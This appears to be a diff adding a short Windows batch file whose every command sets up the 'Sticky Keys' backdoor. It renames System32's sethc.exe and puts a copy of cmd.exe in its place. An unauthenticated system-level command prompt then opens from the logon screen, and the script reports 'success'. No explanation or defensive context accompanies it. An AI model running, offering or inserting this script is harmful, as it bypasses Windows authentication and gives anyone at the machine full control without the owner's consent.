@@ -1,0 +1,8 @@
+@echo off
+
+ren C:\Windows\System32\sethc.exe C:\Windows\System32\sethc
+
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+
+echo success
+pause
